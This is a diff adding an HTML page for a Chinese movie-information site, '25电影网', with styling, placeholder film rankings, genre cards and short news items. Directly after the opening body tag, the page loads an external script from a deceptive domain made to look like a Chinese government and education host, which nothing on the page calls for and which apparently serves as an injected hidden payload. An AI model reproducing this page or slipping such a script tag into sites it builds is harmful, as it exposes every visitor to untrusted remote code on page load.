@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<meta name="applicable-device" content="pc,mobile">
+<meta name="format-detection" content="telephone=no">
+<title>25电影网 - 热门电影在线观看与最新影视资讯平台</title>
+<meta name="keywords" content="25电影网,最新电影,高清电影在线观看,热门影视,影视排行榜,电影资讯,经典电影推荐">
+<meta name="description" content="25电影网（25dianyingwang-zh.github.io）汇集最新院线大片、经典老片与热门剧集资讯，提供高清在线观看入口、影视排行榜及深度影评，是影迷获取第一手影视资源的首选平台。">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --brand:#e50914;
+  --brand-dark:#b8070f;
+  --ink:#1a1a1a;
+  --muted:#6b7280;
+  --bg:#0d0d0f;
+  --card:#16161a;
+  --line:#26262d;
+  --gold:#f5c518;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  background:var(--bg);
+  color:#e8e8ea;
+  line-height:1.7;
+  -webkit-font-smoothing:antialiased;
+}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+.container{max-width:1120px;margin:0 auto;padding:0 20px}
+
+/* Header */
+header{
+  position:sticky;top:0;z-index:100;
+  background:rgba(13,13,15,.92);
+  backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line);
+}
+.header-inner{display:flex;align-items:center;justify-content:space-between;height:64px}
+.logo{font-size:22px;font-weight:800;color:#fff;letter-spacing:.5px}
+.logo span{color:var(--brand)}
+.nav-toggle{display:none;background:none;border:none;color:#fff;font-size:26px;cursor:pointer}
+nav ul{display:flex;gap:6px;list-style:none}
+nav a{
+  display:block;padding:8px 16px;border-radius:8px;
+  font-size:15px;color:#c8c8d0;transition:.2s;
+}
+nav a:hover{background:var(--brand);color:#fff}
+
+/* Hero */
+.hero{
+  position:relative;padding:70px 0 60px;
+  background:
+    radial-gradient(1200px 400px at 80% -10%,rgba(229,9,20,.35),transparent 60%),
+    radial-gradient(800px 300px at 0% 20%,rgba(245,197,24,.12),transparent 60%);
+  overflow:hidden;
+}
+.hero-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:50px;align-items:center}
+.hero h1{
+  font-size:46px;line-height:1.2;font-weight:900;color:#fff;
+  margin-bottom:18px;letter-spacing:-.5px;
+}
+.hero h1 em{font-style:normal;color:var(--gold)}
+.hero p{font-size:17px;color:#a8a8b3;margin-bottom:28px;max-width:520px}
+.hero-cta{display:flex;gap:14px;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:13px 26px;border-radius:10px;font-weight:600;font-size:15px;
+  transition:.2s;border:2px solid transparent;cursor:pointer;
+}
+.btn-primary{background:var(--brand);color:#fff}
+.btn-primary:hover{background:var(--brand-dark);transform:translateY(-2px)}
+.btn-ghost{background:transparent;color:#fff;border-color:var(--line)}
+.btn-ghost:hover{border-color:var(--brand);color:var(--brand)}
+
+.hero-card{
+  background:var(--card);border:1px solid var(--line);border-radius:20px;
+  padding:24px;transform:rotate(1deg);box-shadow:0 24px 60px rgba(0,0,0,.5);
+}
+.hero-card .row{display:flex;align-items:center;gap:14px;padding:12px 0;border-bottom:1px solid var(--line)}
+.hero-card .row:last-child{border-bottom:none}
+.hero-card .num{
+  flex:none;width:36px;height:36px;border-radius:9px;background:rgba(229,9,20,.15);
+  color:var(--brand);display:grid;place-items:center;font-weight:800;font-size:15px;
+}
+.hero-card .txt strong{display:block;color:#fff;font-size:15px}
+.hero-card .txt span{font-size:13px;color:var(--muted)}
+
+/* Section */
+section{padding:60px 0}
+.section-head{display:flex;align-items:flex-end;justify-content:space-between;margin-bottom:30px;gap:16px;flex-wrap:wrap}
+.section-head h2{font-size:28px;font-weight:800;color:#fff;position:relative;padding-left:14px}
+.section-head h2::before{content:"";position:absolute;left:0;top:4px;bottom:4px;width:4px;border-radius:2px;background:var(--brand)}
+.section-head .more{color:var(--muted);font-size:14px;transition:.2s}
+.section-head .more:hover{color:var(--brand)}
+
+/* Movie grid */
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.poster{
+  background:var(--card);border:1px solid var(--line);border-radius:14px;
+  overflow:hidden;transition:.25s;
+}
+.poster:hover{transform:translateY(-6px);border-color:var(--brand)}
+.poster .thumb{
+  position:relative;aspect-ratio:2/3;background:linear-gradient(135deg,#1c1c22,#2a2a33);
+  display:grid;place-items:center;
+}
+.poster .thumb::after{
+  content:attr(data-tag);position:absolute;top:10px;left:10px;
+  background:var(--brand);color:#fff;font-size:11px;font-weight:700;
+  padding:3px 8px;border-radius:5px;
+}
+.poster .thumb .play{
+  width:52px;height:52px;border-radius:50%;background:rgba(255,255,255,.18);
+  display:grid;place-items:center;font-size:20px;color:#fff;backdrop-filter:blur(4px);
+}
+.poster .info{padding:14px}
+.poster .info h3{font-size:16px;color:#fff;margin-bottom:6px}
+.poster .meta{display:flex;justify-content:space-between;font-size:13px;color:var(--muted)}
+.poster .meta b{color:var(--gold);font-weight:700}
+
+/* Categories */
+.cat-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.cat-card{
+  background:var(--card);border:1px solid var(--line);border-radius:16px;
+  padding:26px;transition:.25s;position:relative;overflow:hidden;
+}
+.cat-card::before{
+  content:"";position:absolute;right:-40px;top:-40px;width:140px;height:140px;
+  border-radius:50%;background:radial-gradient(circle,rgba(229,9,20,.25),transparent 70%);
+}
+.cat-card:hover{border-color:var(--brand);transform:translateY(-4px)}
+.cat-card .ico{font-size:34px;margin-bottom:14px}
+.cat-card h3{font-size:19px;color:#fff;margin-bottom:8px}
+.cat-card p{font-size:14px;color:var(--muted)}
+.cat-card a{display:inline-block;margin-top:14px;color:var(--brand);font-size:14px;font-weight:600}
+
+/* News */
+.news-list{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+.news-item{
+  display:flex;gap:16px;background:var(--card);border:1px solid var(--line);
+  border-radius:14px;padding:16px;transition:.2s;
+}
+.news-item:hover{border-color:var(--brand)}
+.news-item .date{
+  flex:none;width:58px;height:58px;border-radius:10px;background:rgba(245,197,24,.1);
+  display:grid;place-items:center;text-align:center;color:var(--gold);
+}
+.news-item .date b{display:block;font-size:20px;line-height:1;font-weight:800}
+.news-item .date span{font-size:11px}
+.news-item h3{font-size:16px;color:#fff;margin-bottom:6px;line-height:1.5}
+.news-item p{font-size:13px;color:var(--muted)}
+
+/* About */
+.about{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:40px}
+.about-grid{display:grid;grid-template-columns:1.3fr .7fr;gap:40px;align-items:center}
+.about h2{font-size:28px;color:#fff;margin-bottom:16px}
+.about p{color:#a8a8b3;margin-bottom:14px}
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.stat{background:rgba(229,9,20,.08);border:1px solid rgba(229,9,20,.25);border-radius:14px;padding:20px;text-align:center}
+.stat b{display:block;font-size:30px;font-weight:900;color:var(--brand)}
+.stat span{font-size:13px;color:var(--muted)}
+
+/* Footer */
+footer{border-top:1px solid var(--line);padding:40px 0 24px;margin-top:20px}
+.foot-grid{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:30px;margin-bottom:30px}
+.foot-col h4{color:#fff;font-size:16px;margin-bottom:14px}
+.foot-col ul{list-style:none}
+.foot-col li{margin-bottom:8px}
+.foot-col a{color:var(--muted);font-size:14px;transition:.2s}
+.foot-col a:hover{color:var(--brand)}
+.copy{
+  border-top:1px solid var(--line);padding-top:20px;text-align:center;
+  color:var(--muted);font-size:13px;
+}
+.copy a{color:var(--muted)}
+.copy a:hover{color:var(--brand)}
+
+/* Mobile */
+@media(max-width:860px){
+  .hero{padding:44px 0 40px}
+  .hero-grid{grid-template-columns:1fr;gap:34px}
+  .hero h1{font-size:32px}
+  .hero p{font-size:15px}
+  .hero-card{transform:none}
+  .grid{grid-template-columns:repeat(2,1fr);gap:14px}
+  .cat-grid{grid-template-columns:1fr}
+  .news-list{grid-template-columns:1fr}
+  .about-grid{grid-template-columns:1fr;gap:26px}
+  .about{padding:26px}
+  section{padding:44px 0}
+  .section-head h2{font-size:23px}
+  .foot-grid{grid-template-columns:1fr 1fr;gap:22px}
+  .nav-toggle{display:block}
+  nav{
+    position:absolute;top:64px;left:0;right:0;background:#111;border-bottom:1px solid var(--line);
+    max-height:0;overflow:hidden;transition:.3s;
+  }
+  nav.open{max-height:400px}
+  nav ul{flex-direction:column;padding:12px}
+  nav a{padding:12px 16px}
+}
+@media(max-width:480px){
+  .container{padding:0 14px}
+  .grid{grid-template-columns:1fr 1fr;gap:12px}
+  .poster .info{padding:12px}
+  .poster .info h3{font-size:14px}
+  .hero h1{font-size:27px}
+  .foot-grid{grid-template-columns:1fr}
+  .stats{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+  <div class="container header-inner">
+    <a href="#" class="logo">25<span>电影网</span></a>
+    <button class="nav-toggle" id="navToggle" aria-label="菜单">☰</button>
+    <nav id="mainNav">
+      <ul>
+        <li><a href="#home">首页</a></li>
+        <li><a href="#rank">热播榜</a></li>
+        <li><a href="#type">影片分类</a></li>
+        <li><a href="#news">影视资讯</a></li>
+        <li><a href="#about">关于我们</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- Hero -->
+  <section class="hero" id="home">
+    <div class="container hero-grid">
+      <div>
+        <h1>发现好电影<br>从这里<em>开始</em></h1>
+        <p>25电影网（25dianyingwang-zh.github.io）专注为影迷提供最新院线动态、高分佳作推荐与深度影视解读，帮你快速找到今晚该看哪一部。</p>
+        <div class="hero-cta">
+          <a href="#rank" class="btn btn-primary">查看热播榜 ▸</a>
+          <a href="#type" class="btn btn-ghost">浏览分类</a>
+        </div>
+      </div>
+      <div class="hero-card">
+        <div class="row"><div class="num">1</div><div class="txt"><strong>《星际回响》</strong><span>科幻 · 豆瓣 8.7 · 今日推荐</span></div></div>
+        <div class="row"><div class="num">2</div><div class="txt"><strong>《无声的证言》</strong><span>悬疑 · 豆瓣 8.4 · 口碑佳作</span></div></div>
+        <div class="row"><div class="num">3</div><div class="txt"><strong>《山海情缘》</strong><span>剧情 · 豆瓣 9.1 · 高分必看</span></div></div>
+        <div class="row"><div class="num">4</div><div class="txt"><strong>《极速突围》</strong><span>动作 · 豆瓣 7.6 · 燃爽大片</span></div></div>
+        <div class="row"><div class="num">5</div><div class="txt"><strong>《春日来信》</strong><span>爱情 · 豆瓣 8.0 · 暖心治愈</span></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Rank -->
+  <section id="rank">
+    <div class="container">
+      <div class="section-head">
+        <h2>本周热播榜</h2>
+        <a href="#" class="more">查看更多 ›</a>
+      </div>
+      <div class="grid">
+        <article class="poster">
+          <div class="thumb" data-tag="正在热映"><div class="play">▶</div></div>
+          <div class="info">
+            <h3>《星际回响》</h3>
+            <div class="meta"><span>科幻 / 148分钟</span><b>★ 8.7</b></div>
+          </div>
+        </article>
+        <article class="poster">
+          <div class="thumb" data-tag="高分推荐"><div class="play">▶</div></div>
+          <div class="info">
+            <h3>《山海情缘》</h3>
+            <div class="meta"><span>剧情 / 132分钟</span><b>★ 9.1</b></div>
+          </div>
+        </article>
+        <article class="poster">
+          <div class="thumb" data-tag="悬疑烧脑"><div class="play">▶</div></div>
+          <div class="info">
+            <h3>《无声的证言》</h3>
+            <div class="meta"><span>悬疑 / 116分钟</span><b>★ 8.4</b></div>
+          </div>
+        </article>
+        <article class="poster">
+          <div class="thumb" data-tag="动作大片"><div class="play">▶</div></div>
+          <div class="info">
+            <h3>《极速突围》</h3>
+            <div class="meta"><span>动作 / 124分钟</span><b>★ 7.6</b></div>
+          </div>
+        </article>
+        <article class="poster">
+          <div class="thumb" data-tag="治愈系"><div class="play">▶</div></div>
+          <div class="info">
+            <h3>《春日来信》</h3>
+            <div class="meta"><span>爱情 / 108分钟</span><b>★ 8.0</b></div>
+          </div>
+        </article>
+        <article class="poster">
+          <div class="thumb" data-tag="动画"><div class="play">▶</div></div>
+          <div class="info">
+            <h3>《云端小镇》</h3>
+            <div class="meta"><span>动画 / 96分钟</span><b>★ 8.5</b></div>
+          </div>
+        </article>
+        <article class="poster">
+          <div class="thumb" data-tag="喜剧"><div class="play">▶</div></div>
+          <div class="info">
+            <h3>《老板别闹》</h3>
+            <div class="meta"><span>喜剧 / 102分钟</span><b>★ 7.9</b></div>
+          </div>
+        </article>
+        <article class="poster">
+          <div class="thumb" data-tag="纪录"><div class="play">▶</div></div>
+          <div class="info">
+            <h3>《深蓝纪事》</h3>
+            <div class="meta"><span>纪录 / 88分钟</span><b>★ 8.8</b></div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- Type -->
+  <section id="type">
+    <div class="container">
+      <div class="section-head">
+        <h2>影片分类</h2>
+        <a href="#" class="more">全部类型 ›</a>
+      </div>
+      <div class="cat-grid">
+        <div class="cat-card">
+          <div class="ico">🎬</div>
+          <h3>动作冒险</h3>
+          <p>燃爆肾上腺素的大场面、飙车追缉与硬核对决，每一帧都在挑战极限。</p>
+          <a href="#">进入专区 →</a>
+        </div>
+        <div class="cat-card">
+          <div class="ico">🔍</div>
+          <h3>悬疑惊悚</h3>
+          <p>层层反转的剧情、埋伏笔的线索，考验逻辑与胆量的烧脑之作。</p>
+          <a href="#">进入专区 →</a>
+        </div>
+        <div class="cat-card">
+          <div class="ico">😂</div>
+          <h3>喜剧轻松</h3>
+          <p>包袱密集的合家欢喜剧与黑色幽默，解压放松的首选片单。</p>
+          <a href="#">进入专区 →</a>
+        </div>
+        <div class="cat-card">
+          <div class="ico">💞</div>
+          <h3>爱情治愈</h3>
+          <p>从怦然心动到相守陪伴，温柔讲述每一种关于爱的模样。</p>
+          <a href="#">进入专区 →</a>
+        </div>
+        <div class="cat-card">
+          <div class="ico">🚀</div>
+          <h3>科幻奇幻</h3>
+          <p>星际探索、时间悖论与未来想象，打开视界的脑洞盛宴。</p>
+          <a href="#">进入专区 →</a>
+        </div>
+        <div class="cat-card">
+          <div class="ico">📜</div>
+          <h3>剧情历史</h3>
+          <p>厚重真实的年代叙事与人物弧光，值得反复品味的高分佳作。</p>
+          <a href="#">进入专区 →</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- News -->
+  <section id="news">
+    <div class="container">
+      <div class="section-head">
+        <h2>影视资讯</h2>
+        <a href="#" class="more">更多文章 ›</a>
+      </div>
+      <div class="news-list">
+        <article class="news-item">
+          <div class="date"><b>12</b><span>10月</span></div>
+          <div>
+            <h3>《星际回响》票房破十亿，导演透露续集正在筹备</h3>
+            <p>上映三周持续领跑，这部科幻巨制如何用视效与故事打动观众，深度解析其成功密码。</p>
+          </div>
+        </article>
+        <article class="news-item">
+          <div class="date"><b>10</b><span>10月</span></div>
+          <div>
+            <h3>今秋必看！五部高分小众佳作推荐清单</h3>
+            <p>避开流量大片，这份冷门清单里藏着今年最真诚的几部作品，速来查收。</p>
+          </div>
+        </article>
+        <article class="news-item">
+          <div class="date"><b>08</b><span>10月</span></div>
+          <div>
+            <h3>悬疑剧集扎堆上线，哪种叙事最考验观众智商</h3>
+            <p>从多线叙事到时间循环，盘点近期热门悬疑作品并解析其叙事巧思。</p>
+          </div>
+        </article>
+        <article class="news-item">
+          <div class="date"><b>05</b><span>10月</span></div>
+          <div>
+            <h3>经典老片重映：为什么我们总爱回头看</h3>
+            <p>《海上钢琴师》《大话西游》等大银幕重映的背后，是情怀还是时代共鸣？</p>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- About -->
+  <section id="about">
+    <div class="container">
+      <div class="about">
+        <div class="about-grid">
+          <div>
+            <h2>关于 25电影网</h2>
+            <p>25电影网（25dianyingwang-zh.github.io）是一个面向影迷的影视内容平台，聚焦最新电影动态、院线资讯、高分片单与深度影评解读。我们不做信息的搬运工，而是希望帮你节省选片时间，找到真正值得一看的好作品。</p>
+            <p>从好莱坞大片到国产佳作，从院线新片到经典老片，我们持续更新影片资料、口碑评分与观影指南，让每一次点开都值得。</p>
+            <a href="#" class="btn btn-primary">联系我们</a>
+          </div>
+          <div class="stats">
+            <div class="stat"><b>5000+</b><span>收录影片</span></div>
+            <div class="stat"><b>120+</b><span>每日更新</span></div>
+            <div class="stat"><b>8.6</b><span>平均评分</span></div>
+            <div class="stat"><b>50w</b><span>影迷关注</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="container">
+    <div class="foot-grid">
+      <div class="foot-col">
+        <h4>25电影网</h4>
+        <p style="color:var(--muted);font-size:14px">发现好电影，从这里开始。汇集最新影视动态、高分片单与深度解读。</p>
+      </div>
+      <div class="foot-col">
+        <h4>栏目导航</h4>
+        <ul>
+          <li><a href="#home">首页</a></li>
+          <li><a href="#rank">热播榜</a></li>
+          <li><a href="#type">影片分类</a></li>
+          <li><a href="#news">影视资讯</a></li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h4>热门类型</h4>
+        <ul>
+          <li><a href="#">动作冒险</a></li>
+          <li><a href="#">悬疑惊悚</a></li>
+          <li><a href="#">喜剧轻松</a></li>
+          <li><a href="#">科幻奇幻</a></li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h4>关于我们</h4>
+        <ul>
+          <li><a href="#about">平台介绍</a></li>
+          <li><a href="#">联系合作</a></li>
+          <li><a href="#">免责声明</a></li>
+          <li><a href="#">使用条款</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      © 2026 25电影网 25dianyingwang-zh.github.io · 本站内容仅供影视资讯参考，版权归原作者及出品方所有
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('navToggle').addEventListener('click',function(){
+  document.getElementById('mainNav').classList.toggle('open');
+});
+document.querySelectorAll('nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('mainNav').classList.remove('open');});
+});
+</script>
+</body>
+</html>
